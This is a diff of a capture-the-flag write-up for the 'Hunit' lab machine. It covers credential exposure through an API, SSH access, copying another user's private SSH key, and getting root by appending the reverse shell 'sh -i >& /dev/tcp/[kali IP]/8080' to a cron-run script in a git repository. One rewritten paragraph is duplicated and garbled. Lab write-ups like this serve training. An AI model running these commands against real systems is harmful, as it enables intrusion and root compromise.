@@ -245,73 +245,17 @@ Enumerated top 200 UDP ports:
 
 ![](Images/Pasted%20image%2020221017173943.png)
 
-#### -Navigated to "/api" directory and found the following and clicked "raw data" and found  directory "/user":
-
+- After navigating to the "/api" directory and selecting "Raw Data" we locate a "/user" directory.
+  
 ![](Images/Pasted%20image%2020221017174047.png)
 
 ![](Images/Pasted%20image%2020221017174142.png)
 
-#### -Navigated to directory "/user" and found user login "dademola" listed as an admin:
-
+- We find the user login "dademola" and password "ExplainSlowQuest110" when we navigate to the directory "/user".
+  
 ![](Images/Pasted%20image%2020221017174304.png)
 
----
 
-# Exploitation
-## Located user credentials in websites source code
-
-### **Vulnerability Explanation:** 
-
-#### Title: Exposure of Sensitive Information through View Page Source
-
-#### Type of Vulnerability: Information Disclosure
-
-#### CWE Reference: CWE-200: Information Exposure
-
-#### Proposal for CVSS Score: 4.3 (Medium)
-
-- **CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N**
-- The score is justified by the vulnerability being accessible through the network with low attack complexity, no required privileges, and requiring user interaction to view the page source. The impact is limited to the confidentiality of the information exposed.
-
-#### Generic Description:
-
-The "View Page Source" vulnerability refers to the exposure of sensitive information to users through the source code of web pages. This information might include comments, server paths, third-party API keys, database connection details, or other proprietary information that could aid an attacker in further attacks or unauthorized access. Typically, this vulnerability arises from developers leaving sensitive data in the source code or client-side scripts that are not intended to be publicly accessible.
-
-#### Specific Description:
-
-Exposure through "View Page Source" can occur in several ways, including but not limited to:
-
-- Insecurely including sensitive information within HTML comments or client-side scripts.
-- Embedding API keys or other sensitive tokens within JavaScript code.
-- Exposing internal paths or system information in error messages or metadata.
-- Leaving database connection strings or credentials in client-accessible code.
-
-This type of vulnerability can lead to various security issues, such as unauthorized API access, system enumeration, or database breaches, depending on the nature of the exposed information.
-
-### **Vulnerability Fix:** 
-
-1. **Review and Cleanse Code:** Regularly review web page source code and remove any sensitive information or unnecessary comments that could disclose internal mechanisms or data.
-    
-2. **Use Environment Variables:** Store sensitive information like API keys, database credentials, and configuration details in server-side environment variables, not in client-side code.
-    
-3. **Implement Secure Code Practices:** Train developers on secure coding practices, emphasizing the importance of not leaving sensitive information in client-accessible code.
-    
-4. **Externalize Scripts:** Where possible, keep scripts external and serve them from server-side applications that can enforce authentication and authorization, rather than embedding sensitive data directly in HTML or client-side JavaScript.
-    
-5. **Use Minification and Obfuscation:** While not a security measure per se, minifying and obfuscating JavaScript can help reduce the ease of understanding and discovering sensitive information in client-side code.
-    
-6. **Secure Configuration Files:** Ensure configuration files used by web applications do not contain sensitive information. If necessary, apply proper access controls to these files.
-    
-7. **Regular Audits:** Conduct regular audits of your website's source code, including both server-side and client-side components, to check for inadvertently exposed sensitive information.
-    
-8. **Leverage Security Tools:** Use automated security tools to scan codebases for accidentally exposed sensitive information and enforce coding guidelines that prevent such exposure.
-    
-9. **Error Handling:** Implement secure error handling that does not expose sensitive information in error messages or stack traces to the client.
-    
-10. **Security Headers:** Use HTTP security headers, such as Content-Security-Policy, to add an extra layer of protection against client-side injections that could expose sensitive information indirectly.
-    
-
-Addressing vulnerabilities related to the exposure of sensitive information through "View Page Source" is an essential step in protecting the confidentiality and integrity of a web application and its underlying systems. By adhering to secure coding practices and regularly reviewing and auditing web application code, organizations can significantly mitigate the risk of such exposure.
 
 #### -As port 43022 was found earlier running on SSH I typed the following to login to ssh session with the found credentials above "ssh –p 43022 dademola@192.168.143.125" with password "ExplainSlowQuest110" and received shell:
 
@@ -321,80 +265,61 @@ Addressing vulnerabilities related to the exposure of sensitive information thro
 
 # Privilege Escalation
 ## Local Enumeration
-#### -Ran "lse.sh" and found cron job "crontab.bak" running as root and was readable and found the below contents of "crontab.bak" which file "pull.sh" and "backups.sh" was running every 2 and 3 minutes:
+
+To escalate our privileges, we performed local enumeration using the Linpeas tool. During the scan, we discovered a cronjob named “crontab.bak” running as root. Upon examining “crontab.bak”, we found references to two files: “pull.sh” and “backups.sh”. The cronjob executed “pull.sh” every 2 minutes and “backups.sh” every 3 minutes.
 
 ![](Images/Pasted%20image%2020221017175014.png)
 ![](Images/Pasted%20image%2020221017175126.png)
 
-#### -Searched more and found directory "git-server" and found it being owned by "git" user and was git backend files which are difficult to work with so I navigated to "/tmp" directory and typed "git clone file:///git-server/" to clone the server into the "/tmp" directory:
+To escalate our privileges, we performed local enumeration using the Linpeas tool. During the scan, we discovered a cronjob named “crontab.bak” running as root. Upon examining “crontab.bak”, we found references to two files: “pull.sh” and “backups.sh”. The cronjob executed “pull.sh” every 2 minutes and “backups.sh” every 3 minutes.tory:
 
 ![](Images/Pasted%20image%2020221017175529.png)
 
 ![](Images/Pasted%20image%2020221017175722.png)
 
-#### -Now we can review the contents of "backups.sh" file which shows as a place holder file:
+After cloning the git server, we accessed the “backups.sh” file. Upon inspection, we realized it was a placeholder file. To gain control over the script, we set up our git identity by configuring the user.name and user.email using the commands git config — global user.name “dademola” and git config — global user.email “dademola@hunit.(none)”, respectively.
 
 ![](Images/Pasted%20image%2020221017180046.png)
 
-#### -Set up git identity by typing git config --global user.name "dademola" AND git config --global user.email "dademola@hunit.(none)"
-
 ![](Images/Pasted%20image%2020221017180308.png)
 
-#### -Typed "echo "touch /tmp/gitscript-test" >> backups.sh" and "chmod +x backups.sh" to inject a test instruction into the "backups.sh" file and to make it executable:
+To escalate our privileges further, we injected a test instruction into the "backups.sh" file using the command echo "touch /tmp/gitscript-test" >> backups.sh. Additionally, we made the script executable by running chmod +x backups.sh. However, when attempting to push the modified file back to the git server, we encountered an error due to file ownership restrictions.
 
 ![](Images/Pasted%20image%2020221017180606.png)
 
-#### -But after receiving an error when trying to push the file onto the git-server and further investigation the server is owned by user "git":
+### Lateral Movement
+## Found private ssh key for user in SSH session
 
-#### -Found a user named "git" and found we have read and execute permissions on their ssh "id_rsa" file which is a private SSH Key:
+To proceed, we discovered a user named "git" and realized that we had read and execute permissions on the "id_rsa" SSH private key file belonging to the "git" user. To access the file from our Kali Linux machine, we used the command scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa . to download the private key. We then adjusted the permissions using chmod 600 to ensure proper security.
 
 ![](Images/Pasted%20image%2020221017180818.png)
 
 ![](Images/Pasted%20image%2020221017180904.png)
 
-#### -Navigate to my kali machine and typed "scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa ." to upload the private ssh key to my kali machine and "chmod 600" to set the correct permissions:
-
 ![](Images/Pasted%20image%2020221017185135.png)
 
-## Lateral Movement vector
-## Found private ssh key for user in SSH session
-
-#### -Logged in to remote ssh session by typing "ssh -i id_rsa -p 43022 git@192.168.93.125" and found it to be a git-shell:
+Using the acquired private SSH key, we established an SSH connection to the target machine as the "git" user with the command ssh -i id_rsa -p 43022 git@192.168.93.125. This login provides access to the git-shell environment.
 
 ![](Images/Pasted%20image%2020221017185623.png)
 #GitShell
 
-#### -Since this is a git-shell we should be able to interact with the git repository
+- We should be able to communicate with the git repository as this is a git shell.
 
 ## Privilege Escalation vector
-## Git-shell cron tab privilege escalation
+## Git-shell cron tab
 
-#### -Typed "GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.93.125:/git-server" to clone git server onto my kali machine:
+To elevate privileges to root, we cloned the git server onto our Kali machine using GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.93.125:/git-server. Navigating into the cloned repository, we modified the "backups.sh" file by injecting a reverse shell command using echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh. After committing the changes using git add -A and git commit -m "pwn", we pushed the modified file to the git server using GIT_SSH_COMMAND='ssh -i /home/kali/Downloads/ProvingGroundsBoxes/Hunit/id_rsa -p 43022' git push origin master.
 
 ![](Images/Pasted%20image%2020221017191609.png)
 
-#### -Navigated into git-server and typed [git config --global user.name "kali"] and [git config --global user.email "kali@kali.(none)"] to setup git identity:
-
 ![](Images/Pasted%20image%2020221017203812.png)
-
-#### -Typed "echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh " to inject a reverse shell into the "backups.sh" file and typed "chmod +x to make it executable:
-
-#### -Then typed "git add -A " and [git commit -m "pwn"] to commit the changes to the git-server:
 
 ![](Images/Pasted%20image%2020221017204016.png)
 ![](Images/Pasted%20image%2020221017204123.png)
 
-#### -Prior to pushing the master branch to the git-server to place the reverse shell onto the git-server I started a netcat listener listening on port 8080 on my kali machine:
-
-![](Images/Pasted%20image%2020221017204330.png)
-
-#### -Then typed "GIT_SSH_COMMAND='ssh -i /home/kali/Downloads/ProvingGroundsBoxes/Hunit/id_rsa -p 43022' git push origin master" to push everything to the master branch on git-server onto remote machine:
-
 ![](Images/Pasted%20image%2020221017204550.png)
 
-#### -As found previously the "/root/git-server/backups.sh" file runs every 3 minutes I waited about 3 minutes and received a root shell on my netcat listener:
-
-![](Images/Pasted%20image%2020221017204714.png)
+We then started a Netcat listener on our Kali machine to receive the reverse shell. As the cronjob executed the "backups.sh" file every 3 minutes, we patiently waited for the reverse shell to trigger. Finally, after a few minutes, we gained a root shell on our Netcat listener, giving us complete control over the target machine.
 
 ![](Images/Pasted%20image%2020221017204827.png)
 #Git-serverCronTabScriptPrivilegeEscalation
